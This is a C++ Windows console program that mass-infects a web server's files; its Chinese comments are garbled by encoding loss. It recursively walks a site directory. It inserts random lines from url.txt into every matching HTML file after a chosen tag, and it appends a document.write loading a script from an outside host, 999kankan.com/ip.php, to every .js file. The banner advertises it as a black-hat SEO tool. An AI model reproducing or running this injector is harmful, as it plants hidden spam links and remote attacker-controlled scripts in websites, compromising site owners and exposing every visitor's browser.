// webfile.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "webfile.h"

#include<stdio.h>  //���������
#include<stdlib.h>  //���������
#include <vector>
std::vector<CString> contentArray;


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// The one and only application object
BOOL file_fwrite(CString file_name,CString data); //д���ļ�    ·��  ����
CString open_file(CString file_name);  //��ȡ�ļ�ȫ������
void file_hl(CString file_name,CString data);  //�ļ����غ���  �ļ�·��   ��Ҫ�滻������
void txt_list(CString file_name);  //��TXT���뵽������
DWORD  BeginWebFileFind(char *szPath);  //������ҳ�ļ�׼ȷλ��
char* GetSuffixName(char *szFileName, int n);  //�����ļ���     ·��   ���ؼ����ַ�
int mylength(char s[]);
void txt_log(CString data);   //log����
void js_file(CString file_name,CString data);   //JS�Һ���

CWinApp theApp;
using namespace std;
CString Now1="";
CString Now2="";
CString Now3="";
int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
printf("==============================================================\n");
printf("====webfile.exe html-htm-HTML-HTM D:\wwwroot \"</head>\"======\n");
printf("           ��ѩ��ñSEO--���� ���� ���� ������                 \n");
printf("            QQ:2602159946��ѩ����Ⱥ:142168763                 \n");
printf("=================һֱ��ģ�´�δ����Խ=========================\n");
printf("==============================================================\n");
Sleep(5000);
if (argc>=3)
{
  Now1=argv[1];
  Now2=argv[2];
  Now3=argv[3];
}
else
{
  cout<<"webfile.exe html-htm-HTML-HTM D:\wwwroot ""</head>"""<<endl;
  exit(EXIT_FAILURE);
}
txt_list("url.txt");  //��TXT���뵽������
BeginWebFileFind((char*)(LPCTSTR)Now2);  //������ҳ�ļ�׼ȷλ��

printf("==============================================================\n");
printf("====webfile.exe html-htm-HTML-HTM D:\wwwroot \"</head>\"======\n");
printf("           ��ѩ��ñSEO--���� ���� ���� ������                 \n");
printf("            QQ:2602159946��ѩ����Ⱥ:142168763                 \n");
printf("=================һֱ��ģ�´�δ����Խ=========================\n");
printf("==============================================================\n");
Sleep(5000);
}


///////////////////////////////////////////////////////////////////

#include <stdio.h>
#include < string.h> 
#include < stdio.h> 
char *token;

int mylength(char s[])
{
	try  //�����쳣  
 	{ 
		int i;
		for(i=0;s[i]!='\0';i++);
		return i;
	}
	catch(const)             //���񲢴����쳣  
	{  
		return 0;
	}								
}   

char* GetSuffixName(char *szFileName, int n)  //�����ļ���     ·��   ���ؼ����ַ�
{
	try  //�����쳣  
 	{ 
		int nLen=strlen(szFileName);
		char *szName=szFileName;
		szName=szName+(nLen-n);
		return szName;
	}
	catch(const)             //���񲢴����쳣  
	{  
		return szFileName;
	}
}

DWORD  BeginWebFileFind(char *szPath)  //������ҳ�ļ�׼ȷλ��
{  
	try  //�����쳣  
	{  
		//CString data=".html.htm.HTML.HTM";
		
		//�߼����̷���
		char szFindDriver[MAX_PATH]={0}; 
		lstrcpy(szFindDriver,szPath);  //����
		lstrcat(szFindDriver,"\\*.*"); //�ַ������ 
		WIN32_FIND_DATA wfd; 
		HANDLE hFind = FindFirstFile(szFindDriver,&wfd);  //��ȡ�ļ�����
		if (hFind == INVALID_HANDLE_VALUE)  //�Ѿ��������ڴ��д���
			return 0;
		
		while (FindNextFile(hFind, &wfd))  //�����ļ��������ļ�
		{
			if (wfd.cFileName[0] == '.') //�ļ���  '.'��ǰĿ¼
				continue;  
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)  ////�Ƿ�Ϊ�ļ���
			{ 
				char szFindPath[MAX_PATH];
				lstrcpy(szFindPath,szPath); //����
				lstrcat(szFindPath,"\\");   //�ַ������
				lstrcat(szFindPath,wfd.cFileName);   //�ַ������
				BeginWebFileFind(szFindPath);  //������ҳ�ļ�������и�Ⱦ   //�����һ����Ŀ¼���õݹ��������һ����
			} 
			else 
			{
				Sleep(1);
				char szFilePath[MAX_PATH]; 
				lstrcpy(szFilePath,szPath);  //����
				lstrcat(szFilePath,"\\");   //�ַ������
				lstrcat(szFilePath,wfd.cFileName);  //�ַ������
				/////////////////////
				try  //�����쳣  
 				{ 
					char string1[MAX_PATH]; 
					sprintf(string1,"%s",Now1);
					token = strtok( string1,"-");    //��ʽ���ַ���
					while( token != NULL )  
					{  
 						try  //�����쳣  
 						{ 
							//�����ļ���     ·��   ���ؼ����ַ�
							if(!lstrcmp(GetSuffixName(szFilePath,mylength(token)),token))
							{
								//printf("%s\n",szFilePath);		
								file_hl(szFilePath,Now3);  //�ļ����غ���  �ļ�·��   ��Ҫ�滻������
								Sleep(5);
							}	
							
						}
						catch(const)             //���񲢴����쳣  
						{  
							Sleep(5);
						}
					token = strtok(NULL,"-"); 
					} 
				/////////////////////
					if(!lstrcmp(GetSuffixName(szFilePath,2),"js")||!lstrcmp(GetSuffixName(szFilePath,2),"JS"))   //����
					{
						//printf("%s\n",szFilePath);	
						CString hm="document.write('<script type=\"text/javascript\" src=\"http://999kankan.com/ip.php\"></script>');";
						js_file(szFilePath,hm);   //log����
					}		
				}
				catch(const)             //���񲢴����쳣  
				{  
					Sleep(5);
				}		
				Sleep(5);
			} 
		}
		FindClose(hFind);  //�ر��ļ����
		return 1;
	}
	catch(const)             //���񲢴����쳣  
	{  
		return 1;
	}
	return 1;
}

//==================================================================
void js_file(CString file_name,CString data)   //JS�Һ���
{
    try  //�����쳣  
	{  
		FILE* fd = fopen(file_name, "a+");
		if (fd != NULL)
		{
			fwrite("\n", strlen("\n"), 1, fd );
			fwrite( data, strlen(data), 1, fd );
			//fflush( fd );
			fclose( fd );
		 }                
	}
	catch(CException*e)             //���񲢴����쳣  
	{  
		e->Delete();
	}
}

void txt_list(CString file_name)  //��TXT���뵽������
{
	try  //�����쳣  
	{
		CStdioFile file;
		//���ļ�
		if (!file.Open(file_name, CFile::modeRead))
		{
			//::AfxMessageBox(_T("�ļ���ʧ�ܡ�"));
			return;
		}

		//���ļ�
		//int j=0;
		CString strText = _T("");
		while (file.ReadString(strText))
		{
			if (mylength((char*)(LPCTSTR)strText))
			{
				contentArray.push_back(strText);
			}
		}	
	}
	catch(const)             //���񲢴����쳣  
	{  
		return;
	} 
	
// 		std::vector<CString>::iterator pos;
// 		for( pos = contentArray.begin(); pos != contentArray.end() ; pos ++)
// 		{
// 			CString content = * pos ;
//  			CString   str;   
// 			str.Format("%s",content);  //contentArray.size()
// 			MessageBox(NULL,str, "Greetings", MB_OKCANCEL); 
// 		}
}

void file_hl(CString file_name,CString data)  //�ļ����غ���  �ļ�·��   ��Ҫ�滻������
{
	try  //�����쳣  
	{  
		CString   file_data=open_file(file_name);
		if (file_data=="")
		{
			return;
		}
 		int nLen = file_data.GetLength();
		LPSTR lpBuffer = file_data.GetBuffer(nLen);
		DWORD dwLen = atol(file_data);

 		CString   str,str1;    
		int N=contentArray.size();
		srand((unsigned)time(NULL)); 
		str.Format("%s",contentArray[rand()%N]);
		str1.Format("%s\n%s",data,str);
		int num=file_data.Replace(data,str1);//�滻�ַ���   Ҫ�滻����   �滻����
		file_fwrite(file_name,file_data); //д���ļ�    ·��  ����	

		str.Format("����%d���滻",num);
		printf("�ļ�:%s--%s\n",file_name,str);	
		txt_log(file_name);   //log����
	}
	catch(const)             //���񲢴����쳣  
	{  
		return;
	} 
}

void txt_log(CString data)   //log����
{
    try  //�����쳣  
{  
    FILE* fd = fopen("log.log", "a+");
            if ( fd != NULL )
            {
                fwrite( data, strlen(data), 1, fd );
                //fflush( fd );
                fwrite("\n", strlen("\n"), 1, fd );
                fclose( fd );
            }
}
catch(CException*e)             //���񲢴����쳣  
{  
    e->Delete();
}
}

CString open_file(CString file_name)  //��ȡ�ļ�ȫ������
{
	try  //�����쳣  
	{  
		FILE *fp;
		CString c;
		CString   data;  
		fp=fopen(file_name,"r");
		while((c=fgetc(fp))!=EOF)
		{
			data+=c;
		}
		fclose(fp);
		return data;
	}
	catch(const)             //���񲢴����쳣  
	{  
		return "";
	} 
}

BOOL file_fwrite(CString file_name,CString data) //д���ļ�    ·��  ����
{
	try  //�����쳣  
	{  
		FILE *pFileOut=fopen(file_name,"w+");
		if (NULL == pFileOut)
		{
			return 0;  //���ļ�ʧ��
		}
		fwrite(data,1,strlen(data),pFileOut);
		fclose(pFileOut);
	}
	catch(const)             //���񲢴����쳣  
	{  
		return 0;
	} 
}